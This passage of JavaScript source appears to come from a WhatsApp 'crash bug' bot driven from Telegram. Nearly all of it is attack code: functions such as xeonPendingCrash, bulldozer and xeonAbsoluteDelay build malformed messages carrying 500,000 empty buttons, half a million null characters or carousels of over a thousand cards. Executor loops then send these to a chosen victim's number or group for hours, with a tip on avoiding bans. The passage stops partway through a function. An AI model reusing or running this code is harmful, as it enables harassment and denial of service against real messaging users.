kjztv6LjpVDRqh22/UL0S8BwIMhzeFODhwboxLetl6O8bFebXYaVQOFgbjoV30aralPONd+iUrzHMLHlp1BhaYan4lYAiWi5XbVw9OsczpB5jdXSpMpNhg/3Kaa534ZpbndaxJhRgHQ57ekq8dWAb4TTc+bouSjUNKqHjbVPi/HpV2GpReN4Xlt8wles1wcAW3B0KydhqL3ZoInkdUlxJWX4fT89Q9gujEPyUHu6Qra0NaGtEAaALixtXO7w26N1PVTtO1GBH8x6Fd7/I7sVxYEfzB/SV2v8jptY6q3pXkLq/D/AJrv0rlXXgPM/sreLXZVtRef7SvK+lenX+Q/9K8wHhhSJHbgSG0HE6Zv8Ir3wryWkEwVOFdlw5AElzinVcThniAIAi6fT6jAZcz5EuGi6qrS9ha0X1XnUKnhVQ7bdek14fJaRGxlKVzZyGAGSwe4WRHi1WsbeSu19Cm8lxkE7gop0WUjwDXUnVNGhXn4ok4mW/TAkc121qopUy467DmVw0yGO8R5JnWEhHcyu6rScwuIeLu4ZgcwkKbabmtfWawAw6o0E66e65sM92HrCo0xaARddr6TKrG+FSIYOJoP39CjLalRpYbENH8Q1wrGAQ4QR/cuHFZvG+OeNrIMDVUyvSbXJp089AnKWlux2/8AqnGvp1K80fl+GIUkJHnhJMJLboNkIQgEIQiBCEIrTR3qqGs3THcJiyiFpsUCYLSwQeuiqIIKLBxdHugKny3Dos/rB6LbLIPIhZuZldaUIBIY13SCtWtijJvJKzyzSvpZbEgURvG6CAMzXgD65U+HPSVDH5Q7YnkqDnuc1rXATbkJREvowNZKvC1/DdkceEnXklVplrgCQ47wZWZpGbIr0yA4EESCNFxVMKJ+G62sFRSq1KNvM3kVv/FU3+aW/dT2I5v4aqPoPotKeHrAzljuV0itRsfEbbS6ZxNEfWD2TaM2YRszUOY8hYKcZTa1oc2AdIG6H42bU2epXMS97i55kp6HuVBF1e6UXVUqdR1J0tK6RjrXZfoVzHdQUHRVxL6jS0DK08lpSxRZSawski0ysgwfZdT6TWtYcty4IjNrfFry+2YFZuoEuflBIBWlV+XE5WiwOW66WyIuTe5Kg85tWroHujunTY7+IYDJObdU9nhVnNd1IPRbUW58SXDytGvVVXUTBk6aleaapGIe9tpJvyXpO4Gl0wAJ0XkXc6TupEjd+JJo5Bvr2WQFtEgFYPCqqHBW2sRTynUaHklE3UEILq1TUIn/APEqdR9J2ZhIKlPVB0jHO+pgPYwpfjXuEMAb11K54uiEyBXJkoTgpKq0pVqlLym3I6LoGMdF6bT6rnYJaPVbBjcgMbkH2UQqmMqPENhoPLVZNHBKiOD1WjZyTtCB0nOpVC5vZaPrveC2NiqoMDiJ/O1a16Ia+35XIjzlpSqupOJbFxBWaFWm78U99PJDQIjqs8vCOqkBaaNCiBlY02lpaDuJ2VVMQXsLAwNnUqS26C0NlBmRZXSrPpG1xyKC0hmY6HQoaGnX3lB0txrY4qZnoUn463AyOpKdOhQewuDzI5/t3QcMDLW8XLigj0UyJ45nufUcHVCSToFYY8ZmuZquxmEd4TG1GPO9hp2QGMbNNzDUnymq2Mvsmprnylzcri1oBsdY7qqIqMqtLXZhzmARvPIJvwpYX8RYHGMp/wCXUlmWmWtlrZsCbnqVV60q4gh5FNwDHCxiCVnULC1uQyAwA20KitSdmD2gZCLCdB1WQcSCyLzzUwxASKYSWmghCEAjZCEAhCERvYalAcNmypsnmItJHZRGgJOxTk9B9ys91QIBQXvIMjsocCAXTbS6trlLpdYmyEJzoAyAZStrvpCBchZFsNBBtyV0nEU3NFi2/wB0U24apG3eEOaKXndTPTdM03vPxKjnSfRQWUhWyEiI06oyDVoh0hpfeLJeLJMNA+6Rim/6cvMKcxtLDf0RQ9r33DpHRZupkCYKsfMAgAE7J1ahbME2PNBk2mSJ0CYYJjdHivJnMU6esnWUVbaYCUWWhsQOig2KIk6nsom6t2pUHUIA6FJyEO2RWskNkGCVtTq1Him0uvmBWTQDA6E/ZalmSmA0QCReI+6Axd6lxcA3WmHq+IIzcYEEc1k5pe4ZnOMzq5YlgaTDhI0goPQLWu1AI6hDRFhAHQLzxiqzbZye90Pr1n8LnGD6KYmN8XiAW+GwyTqVzRCTGzfoh2qqlpdAKEw1AwDMwg66JTexgBGb+5AonQIIQXEaFF+aAAIRKRkbokoCeqSEKq1p+X0K6ZBptHImfZc1Py+66AQKbeBwzOnTWyiOT/T9VYIDADuFEcESNUyJA6Dmqreg6HAgwM4mV1ViXFpP/TcuRhiRvnnut67wA2BlAY4QFGa89CEKtG3VaxwNWYtCsGWtA6qICYTduFOp9VZHEURpQcwNeyoYa4C/VZcNKt+dgMdwhvE4AkC+6p9CqxuYtJb+YXHugqm+myWkOyzY6X6+iyqVHB52ItA2V0qGZxY9xaeQuqfRL2AtOYt15x1CKdCtVe0tFVw5iZkLRmIe1+dxLiDAnVx5dua5CcrrCAPdaVH5Tb5ka8ufqiY6KTsM2RVzz0PCF0Nbg3t4argBsRI+y8eSN0wbyquPaGEouEBxN7FsG3TkofhTTp1DxlsWD6d5XnMrvZdtQiPVasxj8znG5LSJm6J65Nkk0lFNJCFVCEIQCEIQaoGuiU8lQJHJRFBpJVBnM+ybbNk2B+6QklEOzRdT4p+i15kiSre3QG4KytfKLc0WLJ+BczcK6AnOJI2WTh8Jw7QtKGZsl31XjshW2Z7TkeAYE5p1UUwLve1rnZok6QtczqjTAgnbspe0tY0mC469EZZ1qkYciDMQSgnM4AXtdZ1DFrlXxSzbWUViWzY7HVS+4JWk3d3KzdZhQZrWhr7rJaULOKLWpNwofoT1VON45KHaoiSbqd0zZxSKKDok6xiZCtsBsk3KkggExbmg1ZBN50OnZdlWhTDGHI67hq6VwUy41ABqbLtJrPAHAIIOs6IlJ7QKrQyi0QDY7qCypUe4eGAJBgOAhb5HlwLnNmCPKoLWtJ42gbwgx8ECmXuc3eBvqirTyuAIgBVFO8OJ52ScS4BraZBGriUHOTlGnmupJnVaup6ZjYWsoyAuIZmjYlFROyJHVaFlgJv10R4TjsAgzkdUGOqvwzPmHoE/Di8k+iDOeiMyo76iNkFrdjsqJzIJlUGEnVGS90EIV5APMTfkECnOjhPI2RVUhb0MLoGYkaQDa/RYsa5otB13TDn5QCwQLWbqojQUZEFgmAodSlphogA+ibXNB1LfcFaNLHAtFUgd5RGfgEOa4gwSNWp1aYm7AOE2C1cQQA2oCAZ0WdQuMnMww0jVBxoQhVpdMgB08rJgWCTLmOqG6CVEAN/VXN55hZnX1VztEIGRIKTg5rcpJbzEoLoEJl4LA2oCQNCNQgVM5WkbnVXSqVPFDmFxfI0NyoDWCDnJHLKhgIcS3ZpN0HS6qZbTFQvi8EDh7FZONJ2YuYc3Q2UUSG1Gk6CxSvMHWboGaLXDM14A5ON1k5pbyTPlUqgVt4YEwYuYlQDBmAe6cyZRQkmkogQhCoEIQgEIQitQqA35JBMwoysmYCJ5KA6DZMFBs4SLrIgNsPQK5hsnRZk8Wk8kWKpyWOBK1PmZ3CypHhJ6LRxu0qFdNWo0VAQDABHqsaziS0ZYGWZlahw8Y5QJGhUj8pBm6rLJrJbJSdOcDaFTGvNjwgarNhAHqVFJwAcQsXEQ6QdLQtXkCDzWVTyqjJa0dSeV1krp2zdkVq/XqT/hRHCTOiuqIeGEydfsshN0QGSZS0MlBdaAp7opzonJ56qUKqpoMzPstPEdo4kxtKylGY+6iN/EbEEH/wBlTazR09FzBNB1isD9f2TNRrtST6rkRKJjrhovlBRINwAO4XKHHmmKjhoUMdADbzF+qMjIgNnqsPFduUw/ug1I5Zv/AFQQ4/UIWYcOZTLhsUD4oggQOqBbZqn1QSNMsoHA3A90i5mmX2QYHQ90s20goES0CwKUt/KfdUQkQI6oqSRs0+6M7uqICEC8R43SL3HU/ZB9UR3QKSkmQkqoQRBgoQgYVA2hSIjS6EQ7THM6pkkuk6qQeaomTKAQ4WaOYQDZI6fZQU1s2F02vDHNJkiLgKabi0gjVB580FVhldlAIbbLO4SBlzVXiF1PIRmg2nZQ03HdAj5B3Uqj5B3UqqExqkgaoGhNLZRCQhCoEIQgEIQg1lKUpE6oc/kSSFBYuLBMAAST6BSG8zKY0kCDzKCs0i7R6lZ6vyg+ytzIBLic2xWY8ze6EbUrshaOMEHkVFLyFWYLzm0RK3YIc0nzEgW3TqPaxplwBnRTVDyBUbAY0WJMFYF4BBgkTcohh5cQNASSSs88Egfmsrc4NEtAkc1FME5nG6Kl2o6FTV5HmriL+snRQ5wOmnNBmehlVTPEeykyDdNrjmF1Vb1XAkuNjyCwdLuyt0Wv7p5IuQYO4UGYAHdMNI9eqssi+YQkI3/ZBJ7BStRTDhYgo8M/lcgyhOFpkIsS0dyjL1BQZwhXlnkAmWIMzrr7oV5J2R4aBIVCmU8nVEQhXkKMhhBKWuxV5CllKBXR3Q4EDRKTyKKpHslHdBHNEMGE/VSATYT2CcEagoHqEsqIITBcEE5TskQrkn/4lM6koqISIK1y7xKTr3N+5QZJLQxuoKA1QdEGJsZSVUxdCVkwRugo2aQdZ0UJusUkFN0RciOiTeSe0qIBLdNQUwZInmkdSeqB5h1KAMQpTOiSqhAQmNUDCQTCkqIaSJKf2VUkIQiBCEIrQNuLe6eWCJKA4AgJl26iGQA20Sm1x0m/NIXbKANtEQ5kOvNlk3zMWjBDXyOazAu1Fb0vKexVa36qKR4T6rRglvqiVdSuXtc2xEx2U0mB9QkjhDQpLIzODhBMgIDnCw4Rz2QOuAXcMAAXUeN4YgWHLdBcSQ1ru7ljllxQDiXDkNglHoP3VeQg3nY7Ki/4Ya8GB0RWZNocDZNrASMpnpyVZR4cz5uqpo4C2RJub6oHEHLYHYO/3Sa4tkNAF7DWUiM0yfdEAQiB4DpJM80mtH5VTRMgXn0VCxuPWUGeRoIkQtDBMzPqtAwkAl0AaSVDxEEOnnF4QKLWj2U2E7q8rpuE4HRBGkSAZGxVATt6p5QdFWXqgXSLJgBAYNpV5NwiIkIy30VgHknlPJBESLBECFplPJGUHS6DOyGgEkWCvKOaYbz+yCX0pbq33Uik0G8LZtMTaUyyXGRHVBiacnhAPqkW7ZAF0+G4AR9lbmNa2ahZCDzqrJjK4AjnZNrMQLAgx1ldNWoxg4JJ5RZIEOqPBiWxvFkGRNTIQ9tOdipp8TA40SRzaV0+A2ACBbS4sswDhy4MLXNN8hdceqBZKcWpuJ7aKfCcNWH0C6GVBUZmDKkdIKgVWGq1oaRmBidygxltgWOB3MWSyMcYBE8l1Tms5s91Joh7pDXSORQcpotzQZCl1IAWIK6JAkZnHu6Vm9gd+b7IrBzLWH2Weh0ldbWtGkmeaipTyOhzfcyi65oRotiWh0bj2Wb2gGRoqJQhCKAnskbIQMFAOndJCBlJBQgEDVCBqEFhQrGhUKIYRCAhVSQhCAQhCC/qCt3RR9QWjvKFES3RMkxYSUgrAmQiFxEGSOyzH0d1rAynmSstmd0VtSHCe60aeGOqzp+V3dXMM9UQhN2u8zNQVLnT62JVPNw8m+h7KIIJbYnbogkyYgwOapjQNxm5hPNDQAJy77pQHXAAI5hAXJ0CWQtIDrE77pgy0GP902m5FyN0GeUD6h6FPJH0q+EgQ1oI1EIAnQIpAnTTdUKZJklU1sAtaTEyqFP3RGeQTce6MonZbBo9VTQCYARGQm45ptZC0hsahEW3gaIIAHMEFHCGR10V8M8Vj1VtDBoWoMWiB5T7KgD+T3stgZm499EQ0bg+qoyAJ2hVEmIsNVRfTaJBk9FdKMlyATc3REhoG0d08nf0VcJN35uioG8yAgxdIiGz1V5BF1oL6EIg7QT3QZAAWICeRuxj0W0sIEx6pDw58wtsSgxLCHCBKsYcu1B91ZDy/wCGwZQNZkFbgA3dfog5/wCFeN7dFDqJb5mEjmBout1RobDAR3UVDLBZx2BQchpiDIkcioOFpuuaTu/NdnCAZp5+YlTAcCWhzI66IOKq2jSaQ+iZHU3W2ek2iKtCtEiTTddbCnUcTlfNtDf25Llq0wQGvMNFom4RWtIPews8YZREFoE9VzYzC1GfGa57oM32R4FJjx4nitbtAke+qVSGOLadSaZHnN5RXZSeytTa4g5v8qHMAdIbB5hcmAqup1TTtxaTzXc5zjrAHdErB0EiW/ZJ9MWJbH2Whc2JH3SJDjdoHS/+VBzFgDSBr2spLi6WlrSdsoj2W76diWtPcLAxJG+iKmpTLJv6LOAdDbqtCwySCTZZnM0yYHYIqXNi4IIUiy0knTTspc2IVVKEIQCEIQGyEIQCbfMEkDVBahX/ALKEAE0ghECE0kUIQhBZ1C1Ogssj5gtj5QojMaqhqVI8wVboij5Fhs3uug+Rc48re6LG9LyHutG+ZvcKKeh7laM1H6giIJu4bHZQcokOBvuOaoeb1Tf9Xb/CpGIlkEmI6ILpFy3ulU8jeyzRVl/CBmEDkFXiSIgu9FDV0YfV36SgzYXOcGxAO+kLUl07clodu4WZ1KiKaQQZtyjdMxBBmCs2+YLoGiCGwWyCbbKhrmOqbkjoiIc0mS10GNwpour05EZh3Tq+en+n/C0GgVUnPdUdDmW63+60BEWa0eihvmK0dqiAXF2j1QG9ggedN31dkQA7W9kZQ7mUx/hU3QoAnKLKQczx05rRm6in8xyDQhu4UkDUadU3+f0SxHy3dkDOZrjwgOGohMFkS4Aeiyb5B3KsINRVaYDCJ6hDQ8tOYzeRCyb5wuqlqgw8RwAEFX4lR4yxm6IqalS3zeiB5y1suY+RsEi+/DmNtOao6qXeb0QSatQOhzgfRW3w3NBDSCNeqxqfT3WmH3QQ6YJFwNt1kDAcMzHQLfDuV14v5b/RZO8vqg8urmzF31AySuluKZUAl+R265MT893dKrt2RvHozIsZ6hS4FxvmJWf4Zq70XbiPNT7ozfHJ4bgd0nFxseKOYXbV1b3WY/qfRRNcLgZsCI6qCQJzf7roxPnZ3WNXQdkajMmD0PRM3sVdf5bO6gbdkGLm5SktKqkaKtJQg6oQCEIQCBqhA1QWoV7KFABCAhUCEBCAQhCD/9k=",
        contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true,
            remoteJid: "status@broadcast",
        },

        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",

        scanLengths: [
            9999999999999999999,
            9999999999999999999,
            9999999999999999999,
            9999999999999999999
        ],

        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    }
}, {
            userJid: target,
            quoted: null
        });

        await userSock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, {
            messageId: msg.key.id
        });
    console.log(chalk.green(`androgcstatus sent to ${target}`));
  } catch (err) {
  console.error(`Error in androgcstatus for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonStatusGroupAndroidExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonStatusGroupAndroid(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in groupfriz: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonPendingCrash2(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

const xeonbotinc = {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                body: {
                    text: "Telegram: @dgxeon13"
                },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                }
            }
        }
    }
}


    await userSock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: xeonbotinc
            }
        },
        {
            messageId: null,
            participant: {
                jid: target
            }
        }
    );
    
    console.log(chalk.green(`Delayfc2 sent to ${target}`));
  } catch (err) {
  console.error(`Error in Delayfc2 for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonPendingCrashGp(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

const xeonbotinc = {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                body: {
                    text: "Telegram: @dgxeon13"
                },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                }
            }
        }
    }
}


    await userSock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: xeonbotinc
            }
        },
        {
            messageId: null,
        }
    );
    
    console.log(chalk.green(`Delayfc2gp sent to ${target}`));
  } catch (err) {
  console.error(`Error in Delayfc2gp for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function spamDelayFC(target, userNumber, chatId, botInstance, isGroup = false, count = 3333) {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
        throw new Error('No active WhatsApp session');
    }

    const userBot = getUserBot(botInstance);

    // Initial notification only
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
        caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Bvg sent to 👇
│➻ Target: ${target.replace('@s.whatsapp.net', '').replace('@g.us', '')}
│➻ From: ${userNumber}
└────────────────────────┘`,
        parse_mode: 'HTML'
    });

    for (let i = 0; i < count; i++) {
        try {
            // This check uses your original validateSession
            if (!(await validateSession(userNumber, chatId, botInstance))) {
                break;   // Just stop silently like androgcstatus
            }

            if (whatsappStatusMap.get(userNumber) === false) {
                break;
            }

            if (isGroup) {
                await xeonPendingCrashGp(target, userNumber, null, botInstance);
            } else {
                await xeonPendingCrash2(target, userNumber, null, botInstance);
            }

        } catch (e) {
            if (e?.message?.includes('No active WhatsApp session') || 
                e?.message?.includes('loggedOut') || 
                e?.message?.includes('401') || 
                e?.message?.includes('connection')) {
                break;
            }
        }

        // Keep bot responsive (important)
        globalSpamCounter++;
        if (globalSpamCounter % 30 === 0) {
            await new Promise(resolve => setTimeout(resolve, 5));
        }
    }
}

async function xeonPendingCrash(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

const xeonbotinc = {
        interactiveMessage: {
            body: {
                text: "Telegram: @dgxeon13"
            },
            nativeFlowMessage: {
                buttons: "\0".repeat(500000)
            }
        }
    };


    await userSock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: xeonbotinc
            }
        },
        {
            messageId: null,
            participant: {
                jid: target
            }
        }
    );
    
    console.log(chalk.green(`Delayfc sent to ${target}`));
  } catch (err) {
  console.error(`Error in Delayfc for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function wui(target, userNumber, chatId, botInstance) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  // Validate target JID
  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const { TrashLocIOS } = require('./69/Data4.js');

  try {
    // Execute the TrashLocIOS function
    await TrashLocIOS(botInstance, target);

    // Send success message with mentions
    await botInstance.sendMessage(chatId, {
      text: `Successfully Sent Bug To @${target.split('@')[0]} Using *wui* ✅\n\nPause 2 minutes so that the bot is not banned.`,
      mentions: [target],
    });
  } catch (error) {
    console.error(`Error in wui for ${userNumber}:`, error.message);
    throw error; // Throw error to stop execution and notify the caller
  }
}

async function bulldozer(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    let push = []
  for (let r = 0; r < 1005; r++) { // Or 1055
  push.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: " ",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
        fileLength: "18352",
        height: 720,
        width: 1280,
        mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
        fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
        directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1737281900",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
        scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
        scanLengths: [3537, 10557, 1905, 2353],
        midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
      }
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
  })
 }

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: "Telegram: @dgxeon13" }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] })
          })
        }
      }
    },
    {}
  )
  
  await userSock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  })
  if (show) {
    await userSock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Telegram: @dgxeon13" }
          }
        ]
      }
    )
  }
    console.log(chalk.green(`Stressking sent to ${target}`));
  } catch (err) {
  console.error(`Error in stressking for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonAbsoluteDelay(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

const totalPushes = 10;
   for (let i = 0; i < totalPushes; i++) {
      const push = [];
      const buttons = [];
      for (let j = 0; j < 5; j++) {
         buttons.push({
            name: 'galaxy_message',
            buttonParamsJson: JSON.stringify({
               header: 'null',
               body: 'xxx',
               flow_action: 'navigate',
               flow_action_payload: {
                  screen: 'FORM_SCREEN'
               },
               flow_cta: 'Grattler',
               flow_id: '1169834181134583',
               flow_message_version: '3',
               flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
            }),
         });
      }
      for (let k = 0; k < 1000; k++) {
         push.push({
            body: {
               text: 'Telegram: @dgxeon13'
            },
            footer: {
               text: ''
            },
            header: {
               title: 'Telegram: @dgxeon13 ',
               hasMediaAttachment: true,
               imageMessage: {
                  url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
                  mimetype: 'image/jpeg',
                  fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
                  fileLength: '591',
                  height: 0,
                  width: 0,
                  mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
                  fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
                  directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
                  mediaKeyTimestamp: '1721344123',
                  jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z',
                  scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                  scanLengths: [247, 201, 73, 63],
                  midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=',
               },
            },
            nativeFlowMessage: {
               buttons: [],
            },
         });
      }
      const carousel = generateWAMessageFromContent(target, {
         interactiveMessage: {
            header: {
               hasMediaAttachment: false,
            },
            body: {
               text: '\u0000\u0000\u0000\u0000',
            },
            footer: {
               text: 'Telegram: @dgxeon13',
            },
            carouselMessage: {
               cards: [...push],
            },
         }
      }, {
         userJid: target
      });
      await userSock.relayMessage(target, { groupStatusMessageV2: { message: carousel.message } }, {
         messageId: carousel.key.id,
         participant: {
            jid: target
         },
      });
   }
    
    console.log(chalk.green(`AbsoluteDelay sent to ${target}`));
  } catch (err) {
  console.error(`Error in AbsoluteDelay for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
} 

async function xeonAbsoluteDelayExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
